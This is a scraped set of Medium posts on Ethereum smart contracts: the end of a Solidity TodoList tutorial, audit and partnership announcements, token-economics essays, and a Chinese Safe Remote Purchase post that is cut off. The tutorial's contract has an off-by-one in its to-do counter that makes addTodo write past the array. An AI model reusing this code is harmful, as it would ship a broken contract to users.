exclamation sign\u00a0! in front of the boolean value to negate and invert the condition.If require results true, the function executes. If require results in false, the function execution is stopped, and the user will receive an error. The remaining gas will be refunded to the user.Finally, I set the selected to-do as completed.When a user executes a function from the Smart Contract, he needs to send some amount of gas. The minimum amount of gas required to execute any function inside a Smart Contract is 21000 and can be up to 8 million. It\u2019s just a fee that gets converted to ether that miners receive for processing the transaction, in this case, a function execution in your Smart Contract.In Solidity you can use for and while loops:A for loop in Solidity is limited by the gas that you send to the Smart Contract. It will continue looping until it loops all the items or until it runs out of gas. Because in each iteration it\u2019s consuming gas for processing that code. In essence, this means that your for loops are limited to a specific number of loops, you can\u2019t loop endlessly. Here\u2019s the syntax for a for loop:for(uint256 i = 0; i < myArray.length; i++) {   // Do something with the array}That\u2019s why for and while loops are not recommended in Solidity because you\u2019ll probably run into gas problems.It\u2019s your job to optimize the code and to make sure that the loops are not breaking the gas limits by limiting the arrays like I did in this case.You may have noticed that the function markTodoAsCompleted can be executed by anyone that knows the address of this Smart Contract once it\u2019s deployed. By default, all functions are public. This means that anyone that has the contract code can execute and see all the functions.However, we don\u2019t want that. In this case we want to only allow the to-do owner to modify his own notes. That\u2019s the main reason we have an owner parameter in the to-do struct. Luckily, we can do that in Solidity with a very powerful component called modifiers. Let\u2019s see how it will be used in this project:pragma solidity 0.4.20;contract TodoList {   struct Todo {      uint256 id;      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }   uint256 public constant maxAmountOfTodos = 100;   // Owner => todos   mapping(address => Todo[maxAmountOfTodos]) public todos;   // Owner => last todo id   mapping(address => uint256) public lastIds;   modifier onlyOwner(address _owner) {      require(msg.sender == _owner);      _;   }   // Add a todo to the list   function addTodo(bytes32 _content) public {      Todo memory myNote = Todo(lastIds[msg.sender], _content, msg.sender, false, now);      todos[msg.sender][lastIds[msg.sender]] = myNote;      if(lastIds[msg.sender] >= maxAmountOfTodos) lastIds[msg.sender] = 0;      else lastIds[msg.sender]++;   }   // Mark a todo as completed   function markTodoAsCompleted(uint256 _todoId) public onlyOwner(todos[msg.sender][_todoId].owner) {      require(_todoId < maxAmountOfTodos);      require(!todos[msg.sender][_todoId].isCompleted);      todos[msg.sender][_todoId].isCompleted = true;   }}You can see that I created a modifier called onlyOwner. A modifier is like a function that gets execute before the actual function. You first define the modifier, which usually has a require statement inside, then you add the underscore _; which indicates that the code will be inserted below that underscore if you pass the require checks successfully.Finally, you have to add that modifier to the function that you want to be affected. The modifier will be executed before the actual function every time. You have to write it after the name of the function, before the opening curly bracket of the function affected {.Are you still following me? Great.In this case I\u2019m creating the modifier onlyOwner, which receives an address and checks if the user that executed that modifier is the owner that you sent him. Then I added the modifier to the function markTodoAsCompleted to only allow the modification of that note by the owner of it.Yes, it\u2019s a lot of information but you\u2019ll see how powerful the modifiers are. You\u2019ll get used to them pretty quickly as you write Smart Contracts. The structure of a modifier usually is:modifier <name>(<parameters>) {   require(<something>);   _;}You can also add parameters to the modifiers. Otherwise, you have to remove the brackets (<parameters>).Now the function markTodoAsCompleted is only executable by the owner of the note selected by the id. Your private notes are safe now!Here\u2019s what you accomplished so far:You created a contract called TodoLists whose purpose is to create and modify to-do notes.Then you defined the structure of an individual To-do and you created the mapping of all the notes for each user.Then you created a function to add new to-dos to the sender address. Also, you added a function to mark the to-dos as completed.Finally, you\u2019ve restricted the access of the to-dos to only allow modification of the to-dos a user owns with the modifier only owner.Your application is complete. Users can create their own decentralized to-dos using your Smart Contract. Let\u2019s recap what you have learned by doing this project:You know how to understand a specification to extract the information that you need to create your Smart Contract.You know that you have to start a Smart Contract by defining the main variables and components.You know how to create functions in Solidity with return values named or not.You know how to create struct instances using the memory keyword.You know when and how you must use the function require to check for conditions.You know how to create modifiers with or without parameters and you know that you can add as many modifiers as you want to each function.Congratulations. Now you have the basic knowledge of Solidity.I want you to do another project on your own. Look at some simple applications on android that you could replicate with a Smart Contract to make them decentralized. You could even make a game with mappings and structs to keep track of the players and scores.Be creative.The most important thing is that you apply your knowledge with something on your own. Try to complete it in a day or two. You\u2019ll learn a lot and you\u2019ll have something to show to people that will want to hire you.I encourage you to write an article on medium about your own project. It will grow your personal brand which will give you lots of employment opportunities and contract work related to Ethereum.Do let me know what you created. Send me an email to merunasgrincalaitis@gmail.com saying \u201cHi\u201d with your experience learning Solidity. I\u2019d love to hear from you.Here are some specifications that you can use to create a Smart Contract for practicing your skills:\u201cA decentralized recipe application. People post their best food recipes and external users rate the them. They can also indicate that they made the recipe for showing the most popular recipes. The creator of the recipe can write up to 1000 words and add images with external links. Each recipe has a title and the estimated time to make it. Recipes can have tags for improving the search experience.\u201d\u201cA decentralized calendar used by sports people where they indicate what sports did they play each day along with the approximate time dedicated to physical activity. They also rate their day based on the intensity of the sport\u201d\u201cA decentralized social travel platform where users can chat and exchange experiences. When a new user visits a new country, he can get recommendations from locals who earn a virtual token that can be exchanged for ether inside the same contract.\u201dContinue reading once you complete your own project since the next part will go into much detail about the complex parts of Solidity. The basics are essential. Remember to share what you learned. Send me an email or tweet me with your progress.This is the end of the chapter 13 of the book Ethereum Developer: Learn Solidity From Scratch. You can find the book here: https://www.amazon.com/dp/B07BJB1YNQ and it will be free if you have kindle unlimited.Let me know what do you think.", "responses": "5"}, {"title": "MythX is Upping the Smart Contract Security\u00a0Game", "author_name": "Bernhard Mueller", "link": "https://media.consensys.net/mythril-platform-api-is-upping-the-smart-contract-security-game-eee1d2642488?source=search_post", "post_date": "Aug 30, 2018", "readtime": "4 min read", "upvotes": "781", "content": "MythX is Upping the Smart Contract Security\u00a0GameBernhard MuellerBlockedUnblockFollowFollowingAug 30, 2018Introducing MythX, a new project that improves the baseline security level of all smart contracts deployed to the Ethereum blockchain.Bernhard Mueller is a \u201cseasoned cyber security professional\u201d (AKA aging hacker dude) and the creator of the Mythril Classic smart contract analyzer. He\u2019s also two-time Pwnie award nominee (and one-time winner!)", "responses": "3"}, {"title": "Smart Contract Platforms Have to be Store of\u00a0Value", "author_name": "knwang", "link": "https://medium.com/nervosnetwork/smart-contract-platforms-have-to-be-store-of-value-323745fac0a5?source=search_post", "post_date": "Feb 20", "readtime": "3 min read", "upvotes": "2.1K", "content": "Smart Contract Platforms Have to be Store of\u00a0ValuePreserving the value of assets issued on top of a platform is an essential part of its cryptoeconomic designknwangBlockedUnblockFollowFollowingFeb 20There have been a lot of discussions on scalability of smart contract or DApp platforms, but very few on how they would function as value preservation platforms. Unlike payment networks like Bitcoin, DApp platforms provide security to not only their own native coins, but the value of all crypto-assets issued on top of it (typically represented as \u201ctokens\u201d). \u201cStore of Value\u201d for multi-asset platforms therefore refers to the value preservation property benefitting both its native tokens and the crypto-assets on the platform.The key requirement of a \u201cStore of Value\u201d asset platform is that the security it provides has to grow with the value of the assets it preserves. For example, if demand for owning crypto-assets on Ethereum grows rapidly, causing the value of the aggregated asset on the platform to grow one hundred fold, the security (measured by attacking cost) of Ethereum needs to grow along with it to provide adequate protection against attacks. Otherwise, there\u2019ll be more attacks on the network to \u201cdouble-spend\u201d those assets, when the potential rewards get higher and the cost stays the same.We can approximate an asset platform\u2019s security with the income of all its miners or validators\u200a\u2014\u200athe higher this amount, the higher hash rate or staked capital it\u2019ll generate and the platform will be more costly to attack. Assuming miners are paid with the platform\u2019s native tokens and there\u2019s a predictable issuance policy, the growth of a platform\u2019s security is driven by the price appreciation of its native tokens. This requires the native tokens of a \u201cStore of Value\u201d asset platform to be a good value capture of its aggregated asset value.In other words, the demand for on-chain assets has to have a clear way to generate demand for the native tokens as an asset. Only then can the success of token projects contribute to the platform security and the entire ecosystem can be sustainable. This is a unique challenge to multi-asset platforms, because in single asset \u201cStore of Value\u201d networks like Bitcoin, their native coins automatically \u201ccapture\u201d the value of this only asset.When a platform\u2019s native tokens are designed to facilitate transactions, there aren\u2019t obvious reasons that the price of native tokens will appreciate with the value of the assets. For example in Ethereum, the intrinsic value of the ether token is to pay for decentralized computation, therefore its price should reflect computation demand on the blockchain and the liquid available ether tokens on the market as supply at any given time. The appreciation of Ethereum-based assets doesn\u2019t generate demand for more computation nor reduce ether\u2019s supply, therefore would have little impact on ether\u2019s price.When a platform\u2019s native tokens are also used for staking, one could argue that the most valuable assets themselves on the platform have incentives to participate in staking, helping increase the platform\u2019s security. However, this may not be realistic for many reasons\u200a\u2014\u200afor example, the DApp themselves are decentralized communities, and this could become a coordination problem even if there\u2019s willingness to do so; additionally, even if the coordination problem can somehow be solved, it\u2019s always in a project\u2019s best interest to have other projects shoulder the cost of improving the platform\u2019s security and enjoy a free ride\u200a\u2014\u200athe typical \u201ctragedy of the commons\u201d situation and not a stable equilibrium.Token economics not designed for \u201cStore of Value\u201d put a ceiling on how valuable an asset platform\u2019s assets can become. When the value of an asset grows too high for the level of security the platform can provide, transaction liquidity for this asset would dry up since nobody would be willing to transact knowing it\u2019s profitable to reorganize the chain and reverse those transactions.If blockchain technologies will truly revolutionize finance, and decentralized networks are where we move to express asset ownership, we as a community need more research on a new kind of token economics for multi-asset \u201cStore of Value\u201d platforms. The economic research team at Nervos has been working on this for some time and we\u2019ll share our findings soon in our upcoming token economics RFC. Stay tuned!", "responses": "1"}, {"title": "ConsenSys Diligence will audit Brickblock\u2019s smart contracts", "author_name": "Brickblock.io", "link": "https://blog.brickblock.io/consensys-diligence-will-audit-brickblocks-smart-contracts-8d8b6521f96?source=search_post", "post_date": "Mar 7, 2018", "readtime": "", "upvotes": "448", "content": "ConsenSys Diligence will audit Brickblock\u2019s smart contractsBrickblock.ioBlockedUnblockFollowFollowingMar 7, 2018For months, our dev team has been hard at work to perfect Brickblock\u2019s smart contract infrastructure.As we move closer to selling the world\u2019s first tokenized real estate asset, this effort is about come to fruition.It\u2019s now time for one final check.We\u2019re excited to announce that Diligence, a ConsenSys formation, will audit our full smart contract ecosystem. The first contract currently under review is our Proof-of-Asset (PoA) token, which is the engine that powers Brickblock transactions.We plan to continue working closely with ConsenSys Diligence as our portfolio of assets grows and we expand the capabilities of our platform, and we are fortunate to be able to work with a company at the forefront of the blockchain space to further improve the efficiency and security of our smart contracts.We look forward to a prosperous long-term partnership.Results of ConsenSys Diligence\u2019s audit will be published soon.", "responses": ""}, {"title": "Azbit Smart Contract Successfully Passed Bloxy\u00a0Audit", "author_name": "Azbit", "link": "https://medium.com/@Azbit_news/azbit-smart-contract-successfully-passed-bloxy-audit-5eaaa10e0c12?source=search_post", "post_date": "Nov 19, 2018", "readtime": "2 min read", "upvotes": "2K", "content": "Azbit Smart Contract Successfully Passed Bloxy\u00a0AuditAzbitBlockedUnblockFollowFollowingNov 19, 2018We are glad to announce that Azbit smart contract has successfully passed the Bloxy audit!Bloxy is a reliable expert in blockchain analytics. Its audit is based on objective data and pure mathematics using warehouse technology. Bloxy\u2019s clients include Fintech projects, research institutes, data researchers, and the media. In particular, dashboards and graphics created by Bloxy analysts are used by such authoritative publications as Forbes and Business Insider.Today, the security of smart contracts is one of the most urgent problems: the \u201cgaps\u201d in security can be costly for both investors and the company itself. The world of crypto finance still remembers the story two of years ago, when the DAO investment project lost 3.6 million ETH: the hackers took advantage of an error in the code. That is why an external audit is an important step for any smart contract, because it protects the interests of both parties\u200a\u2014\u200ainvestors and companies.Why is an audit so important?- Third-party verification gives investors (including potential ones) confidence that the smart contract protects their interests.- A successful audit of a smart contract indicates that no errors were made in its code. Reliable code, in turn, doesn\u2019t allow hackers to gain access to the funds of the company and investors- When the moment of adding a token to the exchange comes, the exchange can request a startup to share the results of the audit- The availability of a successfully passed audit of a smart contract allows startups to rely on a higher rating in ICO trackers and listingsJoin our Telegram group and social media communities to stay updated.", "responses": "55"}, {"title": "Elix\u200a\u2014\u200aSmart Contract Engineering", "author_name": "ELIX", "link": "https://medium.com/@getelix/elix-smart-contract-engineering-af36ec491553?source=search_post", "post_date": "Sep 27, 2017", "readtime": "3 min read", "upvotes": "1.6K", "content": "Elix\u200a\u2014\u200aSmart Contract EngineeringELIXBlockedUnblockFollowFollowingSep 27, 2017Since our last update, we\u2019ve begun working on our mobile application Minimum Viable Product (MVP), and progressed through the development of the lending smart contracts. We\u2019ve discussed and solved several engineering challenges we faced with these contracts.This week, we decided to examine linking each app installation to only one Ethereum address. If one address is assigned to every user of the app, and that single address is allowed to lend and borrow to/from many addresses, it is possible that a single address can be in various stages of multiple loans at a time. It is also possible that a given address that lends to many people may have more than one loan engaged in a holding period at any given time\u200a\u2014\u200aholding periods are the duration in which a loan has completed and a reward has started to accumulate. Therefore, every address has an amount engaged in a holding period equal to or less than its current balance. This amount engaged in holding can be split into smaller amounts that represent each loan amount in holding.The complexity arises when you look at how the contracts should treat users who try to break holding periods. In some cases, a lender who has a loan in holding may decide to forfeit their reward because they need money right away.But what if a lender has multiple loans in holding, and decides to withdraw an amount of money from their address greater than the amount they have not engaged in holding? Which loan holding periods does the contract cancel, and in what order?To maximize the reward for that lender, the contract should end the loans that most recently went into holding, and progressively move backward in time. This is because an amount of tokens that have been in holding for a longer time period have generated greater reward than an equal amount that only recently went into holding. You could also expand the contract to pay out partial rewards when a lender breaks a holding period, where the partial reward is proportional to the time they waited.For our early alpha MVP, we are currently favoring prohibiting lenders from breaking holding periods. This simplifies our programming and allows us to move forward quickly. Later on, we plan to build a more complicated version that cancels newer loan holding periods first and allows older loans to continue accumulating rewards, while giving partial rewards for loans that had their holding period canceled.As we move forward with our MVP, we will be providing more examples and discussions of the engineering progress we\u2019ve made. Within the next few days, we\u2019ll display our progress on the development of the mobile application.Be sure to checkout our website as well as connect to our social media on Reddit, Twitter, Discord, and Telegram. If you have any questions, let us know and we\u2019d be glad to help clear things up!", "responses": "1"}, {"title": "Agrello, Polymath, and Smart Contract Legal Agreements for Tokenized Securities", "author_name": "Polymath", "link": "https://blog.polymath.network/agrello-polymath-and-smart-contract-legal-agreements-for-tokenized-securities-bd3ab1099993?source=search_post", "post_date": "Feb 12, 2018", "readtime": "2 min read", "upvotes": "924", "content": "Agrello, Polymath, and Smart Contract Legal Agreements for Tokenized SecuritiesPolymathBlockedUnblockFollowFollowingFeb 12, 2018Photo by Sebastian Pichler on\u00a0UnsplashPolymath is pleased to announce our exploratory collaboration with Agrello, an Estonian legal technology company offering blockchain-based smart agreement solutions.Agrello\u2019s blockchain-based smart agreement solutions represent state-of-the-art KYC, ID, and digital signature services.Issuers and investors on the Polymath platform could execute agreements with Agrello\u2019s legally binding smart contracts.\u201cA partnership with Polymath will allow us to showcase Agrello\u2019s cutting-edge KYC and digital signature services in the highly regulated financial industry,\u201d said Agrello CEO and Co-Founder, Hando Rand.Agrello digital contracts could change how people interact with each other, as well as legal authorities. The team shares our vision of smart contract systems being successfully implemented in heavily regulated environments such as the security token ecosystem.As the interface between financial securities and the blockchain, Polymath simplifies the complex technical and legal challenges of a successful token creation.Our open-source network already features exploratory collaborations with some of the biggest names in crypto including BnkToTheFuture and SelfKey, among others. While we\u2019re advising the tZERO ICO, we also manage one of the largest Telegram groups in crypto.Polymath\u2019s security token protocol embeds KYC verification into the tokens themselves, which makes tokens transferable only between authorized participants. By attaching participant\u2019s identities to their wallet addresses, you can create a system where tokens can only go to addresses that belong to authorized participants.Thanks to such baked-in token restrictions, decentralized exchanges can now facilitate the trading of securities, and issuers can rest assured that their tokens are not held by unauthorized participants.As the future standard for securities tokens, our security token protocol greatly improves the world of equity, LP shares, and share units by turning them into programmable tokens.When done properly, tokenized securities could offer a more accessible, more liquid, and more secure form of asset ownership.By partnering with Agrello, Polymath will help power the next generation of securities tokens to create the securities token revolution.", "responses": "11"}, {"title": "What are Smart Contracts?", "author_name": "Florian Glatz", "link": "https://medium.com/@heckerhut/whats-a-smart-contract-in-search-of-a-consensus-c268c830a8ad?source=search_post", "post_date": "Dec 11, 2014", "readtime": "11 min read", "upvotes": "150", "content": "What are Smart Contracts?In search of a consensus.Florian GlatzBlockedUnblockFollowFollowingDec 11, 2014By Florian GlatzThe concept behind smart contracts is gaining traction among wider audiences and with it arises the need for a clear working definition. Currently, the excitement around smart contracts is only matched by the confusion surrounding the specific meaning of the term. Peter Todd, Bitcoin Core Developer, sums up the status quo quite concisely:In this article I try to shed new light on the nature of smart contracts. My overarching goal is to make hidden assumptions explicit and to clarify some misconceptions around the mysterious phenomenon in relation to the legal system. However, this is really just my first attempt to find a way to systematize smart contracts. Hopefully, with the feedback of the community, we can arrive at a clearer picture than what we have now.", "responses": "1"}, {"title": "Elix Lending\u200a\u2014\u200aSmart Contract Interfacing", "author_name": "ELIX", "link": "https://medium.com/@getelix/elix-lending-smart-contract-interfacing-43395e1f91d1?source=search_post", "post_date": "Nov 27, 2017", "readtime": "3 min read", "upvotes": "1.8K", "content": "Elix Lending\u200a\u2014\u200aSmart Contract InterfacingELIXBlockedUnblockFollowFollowingNov 27, 2017This week, we continued working on our smart contracts and app. We have now implemented the ability to pay back loans and added automatic refreshing. We plan to demo this next week. We would like to focus on our smart contract progress in this blog post.First, we have added the ability for lenders to cancel loan requests. This is a small feature but makes sense because lenders should be able to reject requests. Additionally, we have now made holding periods optional, allowing each borrower-lender pair to specify whether they wish to mine after a loan is repaid. For large loans, mining will be useful, but for small day to day payments holding periods might not be desirable.In addition, we modified our converter to communicate directly with the main contract. The main contract restricts the total supply of tokens. Currently in the MVP contract, if X Elixir are converted to the new token at a conversion ratio\u200a\u2014\u200aproducing Y new tokens, Y tokens can be mined. This places an upper limit on the supply of the next token. The conversion ratio will scale the supply down. There will also be vested developer tokens available to fund development, exchanges and marketing. These tokens will be issued over intervals by the converter. We\u2019re also looking into the logistics of setting up exchange-like features within the app, and we\u2019ve added forward compatibility into the token manager to enable burning of tokens should we choose to take that route.We\u2019ve also added the ability to specify interest when requesting a loan. When loans are paid back, the smart contracts check whether the principal plus interest have been paid. Larger loans with installments can already be represented by our token manager as multiple smaller loan objects. As an extra feature, borrowers can also pass messages via the blockchain when requesting a loan. This is a feature we\u2019re experimenting with; we may or may not choose to implement this on a blockchain level.Next, we altered the reward function to give 65% of the mining reward to the lender, and 35% to the borrower. This reflects the fact that lenders take greater risk. In the future, the reward function can be more sophisticated and dependent on factors of each loan within the token manager. We\u2019ve also continually tested our converter contracts and token manager. The below diagram shows how each of the smart contracts interact and are connected:This setup is similar to the common \u201cModel-View-Controller\u201d (MVC) setup used in mobile development. In our case, our model is embedded in the blockchain. Note that the token manager is restricted to issuing rewards by the main contract, and the main contract determines the mineable amount from the amount of Elixir converted. The Elixir conversion process will be handled by the UI of our app\u200a\u2014\u200ayou will simply be able to send your Elixir to your wallet address, and then we will provide an easy flow to make the conversion.Over the next few weeks, we\u2019re continuing work on the app and moving into the alpha stage. The website is concurrently in development, and everything is on track for our in house alpha beginning around January 2018.", "responses": "1"}, {"title": "\u7dda\u4e0a\u8cfc\u7269\u5b89\u5168\u6a5f\u5236\u7684 Smart\u00a0Contract", "author_name": "Yuren Ju", "link": "https://medium.com/taipei-ethereum-meetup/%E7%B7%9A%E4%B8%8A%E8%B3%BC%E7%89%A9%E5%AE%89%E5%85%A8%E6%A9%9F%E5%88%B6%E7%9A%84-smart-contract-5ce3e366cb2e?source=search_post", "post_date": "Sep 12, 2017", "readtime": "6 min read", "upvotes": "221", "content": "\u7dda\u4e0a\u8cfc\u7269\u5b89\u5168\u6a5f\u5236\u7684 Smart\u00a0ContractYuren JuBlockedUnblockFollowFollowingSep 12, 2017\u9019\u500b\u6708\u56e0\u70ba\u6b63\u5728\u505a\u4e00\u500b\u77ed\u671f\u7684\u5408\u7d04\u6240\u4ee5\u975e\u5e38\u7684\u5fd9\uff0c\u73fe\u5728\u624d\u53c8\u6709\u7a7a\u56de\u4f86\u770b\u5340\u584a\u93c8\u7684 solidity \u8a9e\u8a00\uff0c\u5c31\u5148\u5f9e\u4e00\u500b\u7c21\u55ae\u7684\u958b\u59cb\u5427\u00a0:D\u672c\u6587\u6703\u76e1\u91cf\u7528\u4e0d\u9700\u8981\u6709\u7a0b\u5f0f\u57fa\u790e\u7684\u65b9\u5f0f\u6558\u8ff0\uff0c\u8b93\u66f4\u591a\u4eba\u53ef\u4ee5\u7406\u89e3\u3002Solidity \u5b98\u7db2\u7684\u6559\u5b78\u5176\u4e2d\u6709\u500b\u4f8b\u5b50\u662f \u201cSafe Remote Purchase\u201d\uff0c\u662f\u7528\u5340\u584a\u93c8\u5be6\u4f5c\u7dda\u4e0a\u8cfc\u7269\u7684\u5b89\u5168\u6a5f\u5236\uff0c\u8b80\u5230\u6642\u89ba\u5f97\u5f88\u6709\u610f\u601d\uff0c\u4ecb\u7d39\u7d66\u5927\u5bb6\u3002\u66f4\u65b0\uff1a\u4e0d\u904e\u8981\u6ce8\u610f\u5230\u9019\u5c31\u662f Solidity \u7a0b\u5f0f\u8a9e\u8a00\u6559\u5b78\u88cf\u6240\u9644\u7684\u7bc4\u4f8b\uff0c\u4e26\u4e0d\u662f\u5be6\u969b\u4e0a\u7dda\u4f7f\u7528\u7684\u3002\u5c31\u50cf\u6bd4\u5982\u6559 PHP \u7684\u66f8\u88e1\u9762\u6559\u5b78\u8981\u5982\u4f55\u64b0\u5beb\u4e00\u500b\u8cfc\u7269\u8eca\u7cfb\u7d71\u4e00\u6a23\uff0c\u8ddd\u96e2\u5be6\u969b\u4e0a\u7dda\u61c9\u7528\u9084\u6709\u6bb5\u8ddd\u96e2\uff0c\u4e0d\u904e\u53ef\u4ee5\u4e86\u89e3\u5176\u4e2d\u7684\u6982\u5ff5\u3002\u4ee5\u524d /\u00a0\u76ee\u524d\u7684\u4ea4\u6613\u65b9\u6cd5\u5728\u6c92\u6709\u7dda\u4e0a\u8cfc\u7269\u7db2\u7ad9\u7684\u6642\u5019\uff0c\u5927\u5bb6\u90fd\u662f\u4e00\u624b\u4ea4\u9322\uff0c\u4e00\u624b\u4ea4\u8ca8\uff0c\u901a\u5e38\u90fd\u4e0d\u6703\u6709\u4ec0\u9ebc\u554f\u984c\u3002\u4e00\u624b\u4ea4\u9322\u4e00\u624b\u4ea4\u8ca8\uff0c\u901a\u5e38\u4e0d\u6703\u6709\u4ec0\u9ebc\u554f\u984c\u3002\u7576\u958b\u59cb\u53ef\u4ee5\u900f\u904e\u7dda\u4e0a\u8cfc\u7269\u5f8c\uff0c\u4e8b\u60c5\u5c31\u6709\u9ede\u4e0d\u4e00\u6a23\u4e86\u3002\u5927\u5bb6\u5728 PChome \u6216 Amazon \u4e0a\u600e\u9ebc\u78ba\u8a8d\u4f60\u6703\u6536\u5230\u6240\u8cfc\u8cb7\u7684\u6771\u897f\u5462\uff1f\u96d6\u7136\u6709\u8ffd\u8e64\u5546\u54c1\u76ee\u524d\u9001\u5230\u54ea\u88e1\u7684\u5de5\u5177\uff0c\u4f46\u662f\u5546\u5bb6\u6703\u4e0d\u6703\u78ba\u5be6\u51fa\u8ca8\u7d66\u4f60\uff0c\u4f9d\u9760\u7684\u662f\u5546\u5bb6\u8207\u5e73\u53f0\u7684\u4fe1\u7528\u8207\u6cd5\u5f8b\u898f\u7bc4\uff0c\u901a\u5e38\u662f\u4f60\u5148\u4ed8\u4e86\u9322\uff08\u6216\u662f\u4f7f\u7528\u4fe1\u7528\u5361\uff09\uff0c\u63a5\u8457\u4f9d\u9760\u5546\u5bb6\u7684\u4fe1\u7528\u8207\u6cd5\u5f8b\u898f\u7bc4\uff0c\u671f\u5f85\u4ed6\u6703\u51fa\u8ca8\u7d66\u4f60\u3002\u5982\u679c\u4ed6\u4e0d\u51fa\u8ca8\u7d66\u4f60\uff0c\u4ed6\u7684\u4fe1\u8b7d\u5c31\u6703\u53d7\u640d\uff0c\u6216\u8005\u5229\u7528\u6253\u5b98\u53f8\u900f\u904e\u6cd5\u5f8b\u61f2\u7f70\u4ed6\u7684\u884c\u70ba\u3002\u900f\u904e\u653f\u5e9c\u6216\u5e73\u53f0\u76e3\u7763\uff0c\u900f\u904e\u5408\u7d04\u6216\u6cd5\u5f8b\u7d04\u675f\u53e6\u5916\u4e00\u500b\u5e38\u7528\u7684\u65b9\u5f0f\u5c31\u662f\u8ca8\u5230\u4ed8\u6b3e\uff0c\u62ff\u5230\u5546\u54c1\u4e4b\u5f8c\u5728\u4ed8\u6b3e\u7d66\u7269\u6d41\u7684\u4eba\u4ee3\u6536\uff0c\u4e26\u4e14\u6700\u5f8c\u4ea4\u4ed8\u7d66\u5546\u5bb6\u3002\u900f\u904e\u7269\u6d41\u4ee3\u6536\u670d\u52d9\uff0c\u7531\u4e2d\u9593\u4eba\u7d93\u624b\u5546\u54c1\u8207\u91d1\u9322\u4e0d\u7ba1\u662f\u90a3\u7a2e\u65b9\u5f0f\uff0c\u4e2d\u9593\u90fd\u9700\u8981\u9760\u5408\u7d04\uff08\u6cd5\u5f8b\uff09\u7684\u7d04\u675f\u6216\u4e2d\u9593\u4eba\uff08\u7269\u6d41\u696d\u8005\u4ee3\u6536\u6216\u662f\u96fb\u5b50\u5546\u52d9\u5e73\u53f0\uff09\u4f86\u78ba\u8a8d\u96d9\u65b9\u6709\u62ff\u5230\u6b3e\u9805\u8207\u8ca8\u54c1\uff0c\u800c\u5176\u5be6\u9760\u5408\u7d04\u7684\u65b9\u5f0f\uff0c\u4e2d\u9593\u4eba\u4e5f\u53ea\u662f\u63db\u6210\u653f\u5e9c\u800c\u5df2\uff0c\u7528\u653f\u5e9c\u6210\u7acb\u7684\u6cd5\u5f8b\u4f86\u7d04\u675f\u9019\u4ef6\u4e8b\u60c5\u3002\u9019\u4e5f\u5c31\u662f\u5982\u679c\u6211\u5011\u770b\u5230\u4e00\u500b\u65b0\u7684\u96fb\u5546\u5e73\u53f0\uff0c\u5982\u679c\u662f\u500b\u964c\u751f\u7684\u54c1\u724c\u751a\u81f3\u7db2\u7ad9\u505a\u5f97\u5f88\u6389\u6f06\u6642\uff0c\u4f60\u53ef\u80fd\u5c31\u6703\u5c0d\u65bc\u4ed6\u7684\u4fe1\u8b7d\u7522\u751f\u61f7\u7591\uff0c\u9032\u800c\u4e0d\u9858\u610f\u4f7f\u7528\u9019\u500b\u5e73\u53f0\u3002\u4f7f\u7528\u5340\u584a\u93c8\u7684\u4ea4\u6613\u65b9\u6cd5\u5982\u679c\u4f7f\u7528\u5340\u584a\u93c8\uff0c\u8981\u600e\u9ebc\u8b93\u9019\u500b\u4ea4\u6613\u5728\u4e0d\u9700\u8981\u4e2d\u9593\u4eba\u7684\u5354\u52a9\u4e0b\u5b8c\u6210\u5462\uff1f\u9019\u5c31\u662f\u5b98\u7db2\u4e0a\u7684 Safe Remote Purchase \u6240\u4ecb\u7d39\u7684\u4e8b\u60c5\u3002\u5340\u584a\u93c8\u4e2d\u7684 Smart Contract (\u667a\u80fd\u5408\u7d04) \u662f\u4e00\u7a2e\u653e\u5728\u5340\u584a\u93c8\u4e0a\u7684\u5408\u7d04\uff0c\u6703\u4f9d\u7167\u5408\u7d04\u7684\u5167\u5bb9\u57f7\u884c\u5404\u7a2e\u5408\u7d04\u4e0a\u6240\u8a18\u8f09\u7684\u689d\u6587\u3002\u5982\u679c\u4f60\u719f\u6089\u8edf\u9ad4\u7a0b\u5f0f\u7684\u8a71\u63db\u7a2e\u65b9\u5f0f\u8b1b\uff1a\u667a\u80fd\u5408\u7d04\u5c31\u662f\u4e00\u6bb5\u5728\u5340\u584a\u93c8\u4e0a\u57f7\u884c\u7684\u7a0b\u5f0f\uff0c\u4efb\u4f55\u7a0b\u5e8f\u90fd\u6703\u4f9d\u7167\u6e90\u78bc\u4e0a\u6240\u64b0\u5beb\u7684\u65b9\u5f0f\u57f7\u884c\u3002\u800c\u667a\u80fd\u5408\u7d04\u900f\u904e\u5340\u584a\u93c8\u7684\u6a5f\u5236\uff0c\u78ba\u8a8d\u5408\u7d04\u7684\u57f7\u884c\u662f\u6c92\u6709\u906d\u5230\u507d\u9020\u7ac4\u6539\u7684\uff0c\u6211\u5011\u9019\u908a\u5c31\u4e0d\u63d0\u8981\u600e\u9ebc\u78ba\u8a8d\u4e0d\u53d7\u5230\u507d\u9020\u7ac4\u6539\uff0c\u90a3\u9700\u8981\u4e00\u9ede\u7bc7\u5e45\u89e3\u91cb\u3002\u65e2\u7136\u667a\u80fd\u5408\u7d04\u53ef\u4ee5\u4f9d\u7167\u5408\u7d04\u4e0a\u6240\u8a18\u8f09\u7684\u689d\u6587\u57f7\u884c\uff0c\u90a3\u9ebc\u76e3\u7763\u9019\u500b\u5408\u7d04\u6703\u78ba\u5be6\u5c65\u884c\u7684\u76e3\u7763\u8005\uff0c\u5c31\u4e0d\u9700\u8981\u662f\u653f\u5e9c\u6216\u662f\u898b\u8b49\u4eba\uff0c\u800c\u662f\u667a\u80fd\u5408\u7d04\u672c\u8eab\u5c31\u53ef\u4ee5\u76e3\u7763\u5408\u7d04\u7684\u5c65\u884c\u3002\u76f4\u63a5\u7531\u667a\u80fd\u5408\u7d04\u672c\u8eab\u76e3\u7763\u5408\u7d04\u7684\u5c65\u884c\uff0c\u4e0d\u9700\u8981\u4e2d\u9593\u4eba\u5982\u653f\u5e9c\u76e3\u7763\u56de\u5230\u6211\u5011\u60f3\u89e3\u6c7a\u7684\u554f\u984c\uff1a\u6211\u5011\u8981\u600e\u9ebc\u78ba\u8a8d\u5546\u5bb6\u6709\u5c07\u5546\u54c1\u7d66\u4f60\uff0c\u800c\u4f7f\u7528\u8005\u6709\u4ed8\u8cbb\u7d66\u5546\u5bb6\uff1f\u56e0\u70ba\u667a\u80fd\u5408\u7d04\u6703\u4f9d\u7167\u689d\u6587\u57f7\u884c\uff0c\u6211\u5011\u5c31\u4e0d\u9700\u8981\u63d0\u4f9b\u8ca8\u5230\u4ed8\u6b3e\u7684\u7269\u6d41\u696d\u8005\u6216\u662f\u653f\u5e9c\u76e3\u7763\u4f86\u89e3\u6c7a\u9019\u500b\u554f\u984c\uff0c\u6211\u5011\u53ef\u4ee